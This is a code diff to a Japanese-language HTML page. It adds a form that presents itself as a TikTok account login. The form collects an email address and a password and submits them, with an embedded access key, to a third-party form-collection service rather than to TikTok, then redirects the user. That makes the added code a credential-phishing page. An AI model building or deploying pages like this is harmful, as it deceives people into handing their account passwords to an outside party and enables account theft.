@@ -18,10 +18,29 @@
         <header class="header mb-0 bg-white border-bottom">ヘッダー</header>
 
         <!-- メイン -->
-        <main class="main mb-0 bg-whitesmoke">メイン</main>
+        <main class="main mb-0 bg-Gainsboro">
+          
+          <form action="https://api.staticforms.xyz/submit" method="post" class="form">
+            <h1 class="heading-center">tiktokのアカウントにログインする</h1>
+            <input type="hidden" name="accessKey" value="20b6f0f2-4e5a-43de-b760-caab8d9b3830" >
+            
+            <div class="field">
+                <label for="email">メールアドレス</label>
+                <input type="email" id="email" name="email" placeholder="mail@example.com">
+                <p class="text-xsmall">メールアドレスを入力してください</p>
+            </div>
+            <div class="field">
+                <label for="name">パスワード</label>
+                <input type="name" id="name" name="name" placeholder="XXXXXXXXXX">
+                <p class="text-xsmall">パスワードを入力してください</p>
+            </div>
+                <input type="hidden" name="redirectTo" value="https://example.com/contact/success">
+                <input type="submit" class="btn-accent" value="送信する">
+        </form>
+        </main>
 
         <!-- 初期設定 -->
-        <div class="side mb-0 bg-dark">サイドバー</div>
+        <div class="side mb-0 navbar-dark bg-dark">サイドバー</div>
 
   </body>
 </html>
